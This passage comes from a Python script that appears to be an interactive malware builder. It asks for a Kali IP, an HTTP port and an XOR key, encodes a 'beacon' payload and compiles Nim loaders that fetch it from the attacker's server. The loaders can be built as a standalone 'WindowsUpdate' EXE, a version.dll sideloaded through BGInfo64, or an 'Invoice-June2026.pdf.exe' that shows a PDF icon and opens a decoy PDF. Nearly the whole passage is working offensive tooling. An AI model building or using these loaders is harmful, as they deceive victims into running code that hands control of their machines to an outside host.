    print()
    while True:
        val = input(f"  {C.CYAN}>{C.RESET} Choose [1-{len(options)}]: ").strip()
        if val.isdigit() and 1 <= int(val) <= len(options):
            return int(val)
        fail(f"Enter a number between 1 and {len(options)}")

# ═══════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════

def main():
    print(BANNER)

    # ── Configuration ──────────────────────────────────────────
    section("Configuration")
    ip        = ask("Kali IP", DEFAULT_IP)
    port      = ask("HTTP server port", str(DEFAULT_PORT))
    xor_input = ask("XOR key (hex, without 0x)", f"{DEFAULT_XOR_KEY:02X}")

    try:
        xor_key = int(xor_input, 16)
        if not (1 <= xor_key <= 255):
            raise ValueError
    except ValueError:
        fail("XOR key must be a hex value between 01 and FF")
        sys.exit(1)
    xor_key_hex = f"{xor_key:02X}"

    # ── Attack type ────────────────────────────────────────────
    attack_type = ask_choice("Select attack type", [
        f"{C.WHITE}Standalone EXE{C.RESET}   {C.DIM}Method 1 — drop to C:\\Windows\\Temp, run directly{C.RESET}",
        f"{C.WHITE}DLL Sideload{C.RESET}     {C.DIM}Method 2 — version.dll proxy loaded by BGInfo64{C.RESET}",
        f"{C.WHITE}Fake PDF EXE{C.RESET}     {C.DIM}Method 3 — GUI EXE with icon, opens real PDF{C.RESET}",
    ])

    # ── Output filename ────────────────────────────────────────
    section("Output Filename")
    if attack_type == 1:
        out_filename = ask_filename(
            "Output EXE name (no extension)",
            "WindowsUpdate",
            ".exe"
        )
    elif attack_type == 2:
        warn("DLL sideload requires the output to be named exactly  version.dll")
        warn("BGInfo64.exe looks for that filename specifically. Do not rename.")
        out_filename = "version.dll"
        ok(f"Output filename locked: {out_filename}")
    elif attack_type == 3:
        out_filename = ask_filename(
            "Output EXE name (no extension, appears as this to victim)",
            "Invoice-June2026",
            ".pdf.exe"
        )

    # ── PDF-specific: decoy PDF ────────────────────────────────
    pdf_src_path   = None
    decoy_filename = None
    dropped_name   = None

    if attack_type == 3:
        section("Decoy PDF Setup")
        while True:
            pdf_src_path = ask("Path to decoy PDF (e.g. ~/Desktop/bill.pdf)")
            if pdf_src_path:
                break
            fail("Path is required for the Fake PDF attack")

        # Decoy name served from HTTP = base of output exe + .pdf
        base = out_filename.replace(".pdf.exe", "").replace(".exe", "")
        decoy_filename = f"{base}-decoy.pdf"
        dropped_name   = f"{base}.pdf"   # what gets written to victim %TEMP%
        info(f"Decoy will be served as: {decoy_filename}")
        info(f"PDF dropped to victim %TEMP% as: {dropped_name}")

    # ── Icon selection ─────────────────────────────────────────
    section("Icon")
    icon_preset_idx = ask_icon_preset(attack_type)
    need_icon = icon_preset_idx is not None

    # ── Preflight ──────────────────────────────────────────────
    if not preflight(need_icon=need_icon):
        print()
        fail("Preflight failed. Fix the issues above and re-run.")
        sys.exit(1)
    ok("All preflight checks passed")

    # ── XOR encode ─────────────────────────────────────────────
    xor_encode(xor_key)
    files_generated = [os.path.join(OUTPUT_DIR, "beacon_encoded.bin")]

    # ── Icon ───────────────────────────────────────────────────
    res_path = None
    if need_icon:
        res_path = generate_icon(icon_preset_idx)
        if res_path is None:
            fail("Icon generation failed.")
            sys.exit(1)

    # ── Build per attack type ──────────────────────────────────
    if attack_type == 1:
        step("Writing EXE loader source")
        nim_src = os.path.join(OUTPUT_DIR, "loader.nim")
        with open(nim_src, "w") as f:
            f.write(nim_exe_loader(ip, port, xor_key_hex))
        ok(f"Source: {nim_src}")

        out_path = os.path.join(OUTPUT_DIR, out_filename)
        extra    = [f"--passL:{res_path}"] if res_path else []
        # Always compile as gui: no console window appears when run,
        # and the process does not block the terminal it was launched from.
        # EnumSystemLocalesA blocks until the beacon exits (never),
        # so a console binary would freeze any CMD window it was started from.
        if not compile_nim(nim_src, out_path, app_type="gui", extra_flags=extra):
            sys.exit(1)
        files_generated.append(out_path)

    elif attack_type == 2:
        step("Writing DLL proxy source")
        nim_src = os.path.join(OUTPUT_DIR, "version_proxy.nim")
        with open(nim_src, "w") as f:
            f.write(nim_dll_loader(ip, port, xor_key_hex))
        ok(f"Source: {nim_src}")

        out_path = os.path.join(OUTPUT_DIR, out_filename)
        extra    = [f"--passL:{res_path}"] if res_path else []
        if not compile_nim(nim_src, out_path, app_type="lib", extra_flags=extra):
            sys.exit(1)
        files_generated.append(out_path)

    elif attack_type == 3:
        # Copy decoy PDF
        if not setup_decoy_pdf(pdf_src_path, decoy_filename):
            sys.exit(1)
        decoy_dest = os.path.join(OUTPUT_DIR, decoy_filename)
        files_generated.append(decoy_dest)

        # Icon is mandatory for PDF attack (override if user chose none)
        if res_path is None:
            warn("No icon selected — PDF EXE will have a blank default icon.")
            warn("The filename trick still works, but the icon won't look like a PDF.")

        step("Writing Fake PDF loader source")
        nim_src = os.path.join(OUTPUT_DIR, "fakepdf_loader.nim")
        with open(nim_src, "w") as f:
            f.write(nim_pdf_loader(ip, port, xor_key_hex, decoy_filename, dropped_name))
        ok(f"Source: {nim_src}")

        out_path = os.path.join(OUTPUT_DIR, out_filename)
        extra    = [f"--passL:{res_path}"] if res_path else []
        if not compile_nim(nim_src, out_path, app_type="gui", extra_flags=extra):
            sys.exit(1)
        files_generated.append(out_path)

    # ── Done ───────────────────────────────────────────────────
    print_next_steps(attack_type, ip, port, out_filename, files_generated)
    print(f"  {C.GREEN}{C.BOLD}Done.{C.RESET} {C.DIM}Good luck.{C.RESET}\n")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n  {C.YELLOW}Interrupted.{C.RESET}\n")
        sys.exit(0)
